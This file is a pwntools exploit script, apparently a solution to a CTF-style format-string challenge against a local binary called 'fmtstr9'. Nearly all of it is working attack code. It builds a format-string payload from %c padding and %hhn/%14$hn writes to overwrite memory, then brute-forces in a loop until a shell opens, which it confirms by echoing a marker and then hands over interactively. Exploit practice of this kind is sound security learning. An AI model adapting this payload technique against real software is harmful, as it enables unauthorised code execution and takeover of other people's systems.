#!/bin/python
from pwn import *
exe = ELF('./fmtstr9')

context.terminal = ['alacritty', '-e']
# gdb.attach(p, gdbscript='''
# b*play+111
#          c 
#
#            ''')
###############exploiting###################
while True: 
    p = process(exe.path)
    p.sendlineafter(b'>', b'1')
    payload = b'%c'*8
    payload += f'%{0x38 - 0x8}c%hhn'.encode()
    payload += f'%{0x1313 - 0x38}c%14$hn'.encode()
    p.sendlineafter(b'Your name: ', payload)
    p.sendlineafter(b'guess: ', b'2')
    try:
        p.sendline(b'echo lmaodark')
        p.recvuntil(b'lmaodark')
        break
    except:
        try:
            p.close()
        except:
            pass 





#################end#######################
p.interactive()
